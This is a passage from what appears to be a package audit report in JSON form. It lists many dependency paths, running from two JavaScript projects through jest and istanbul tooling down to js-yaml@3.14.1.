            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > @jest/reporters@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-resolve-dependencies@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
